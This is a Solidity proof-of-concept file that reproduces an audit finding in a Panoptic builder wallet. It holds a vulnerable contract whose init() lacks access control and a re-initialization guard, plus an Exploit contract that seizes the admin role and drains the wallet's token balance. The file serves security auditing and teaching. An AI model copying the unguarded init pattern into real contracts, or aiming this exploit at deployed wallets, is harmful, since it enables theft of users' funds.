// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Panoptic Next-Core finding 65025
// (H-01): "BuilderWallet `init()` is unprotected/re-initializable, enabling
// takeover and theft of builder fees".
//
// Real audited source (the vulnerable BuilderWallet is reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/code-423n4/2025-12-panoptic @ a4361d6d
//   file   contracts/RiskEngine.sol
//   cts    interface IERC20 (L2301-2305), contract BuilderWallet (L2307-2331)
//   report code4rena.com/reports/2025-12-panoptic-next-core  (H-01, dtang)
//
// Root cause: `BuilderWallet.init(address)` has NO access control and NO
// "only-once" guard, so it can be called by anyone at any time and simply
// overwrites the `builderAdmin` storage slot (the @> line). `sweep()` is gated
// solely by `msg.sender == builderAdmin`, so after an attacker re-inits the
// wallet with their own address they legitimately pass that check and transfer
// out the entire ERC20 balance (protocol-distributed builder fees).
//
// Faithful deploy path: in the real system `BuilderFactory.deployBuilder(...)`
// CREATE2-deploys the wallet and then calls `BuilderWallet(wallet).init(admin)`
// (RiskEngine.sol L2371/L2385). CREATE2 is irrelevant to the reinit bug, so the
// Exploit reproduces that two-step (deploy, then init) via a direct `new` +
// `init(legitAdmin)` to keep deterministic deploy nonces. The vulnerable
// contract itself is byte-for-byte the on-chain source; the `Errors` library
// and ERC20 are faithful minimal doubles with real transfers/accounting.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Recreates the two Panoptic custom errors that BuilderWallet reverts with
///      (contracts/libraries/Errors.sol L72 / L118) so the reproduced sweep body
///      is verbatim.
library Errors {
    error NotBuilder();
    error TransferFailed(address token, address from, uint256 amount, uint256 balance);
}

// ── VERBATIM from RiskEngine.sol L2301-2305 ──
interface IERC20 {
    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — reproduced VERBATIM from RiskEngine.sol L2307-2331.
// ─────────────────────────────────────────────────────────────────────────────
contract BuilderWallet {
    address public immutable FACTORY;
    address public builderAdmin;

    constructor(address factory) {
        FACTORY = factory;
    }

    function init(address _builderAdmin) external { // @> VULN: no access control and no only-once guard — anyone can re-call init and overwrite builderAdmin
        builderAdmin = _builderAdmin;
    }

    function sweep(address token, address to) external {
        if (msg.sender != builderAdmin) revert Errors.NotBuilder();

        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal == 0) return;

        bool ok = IERC20(token).transfer(to, bal);
        if (!ok) {
            // `from` is this wallet, `balance` is pre-transfer token balance
            revert Errors.TransferFailed(token, address(this), bal, bal);
        }
    }
}

/// @dev Faithful minimal ERC20 double for the protocol-distributed builder fees
///      held by the wallet. Real balances, real transfers.
contract MiniToken {
    string public name = "Panoptic Builder Fee Token";
    string public symbol = "pFEE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver (the attacker): re-init a funded builder wallet to seize
// `builderAdmin`, then sweep out the entire fee balance.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    MiniToken public token;
    BuilderWallet public wallet;

    address internal constant LEGIT_ADMIN = address(0xBEEF); // the honest builder set at deploy
    address internal constant PLACEHOLDER_FACTORY = address(0xFAC7); // stored-only immutable, irrelevant to the bug
    uint256 internal constant FEES = 500 ether; // protocol-distributed fees accrued to the wallet

    uint256 public swept; // tokens the attacker drained out of the wallet

    constructor() {
        token = new MiniToken(); // child nonce 1 (profit token)
        wallet = new BuilderWallet(PLACEHOLDER_FACTORY); // child nonce 2 (VULN)

        // Faithful legit deploy path: BuilderFactory.deployBuilder CREATE2-deploys
        // the wallet then calls init(builderAdmin). Reproduced here as new + init.
        wallet.init(LEGIT_ADMIN);

        // Wallet accumulates protocol-distributed builder fees over time.
        token.mint(address(wallet), FEES);
    }

    function run() external {
        // preconditions: wallet is owned by the honest builder and holds fees
        require(wallet.builderAdmin() == LEGIT_ADMIN, "precondition: legit admin");
        require(token.balanceOf(address(wallet)) == FEES, "precondition: wallet funded");

        // 3) Attacker overwrites builderAdmin via the UNPROTECTED init()
        wallet.init(address(this));
        require(wallet.builderAdmin() == address(this), "takeover failed");

        // 4) Attacker now passes sweep()'s `msg.sender == builderAdmin` check and
        //    drains the entire ERC20 balance to itself.
        uint256 balBefore = token.balanceOf(address(this));
        wallet.sweep(address(token), address(this));
        swept = token.balanceOf(address(this)) - balBefore;

        // harm: all builder-wallet fees stolen by the attacker
        require(swept == FEES, "did not drain full balance");
        require(token.balanceOf(address(wallet)) == 0, "wallet not fully drained");
    }
}
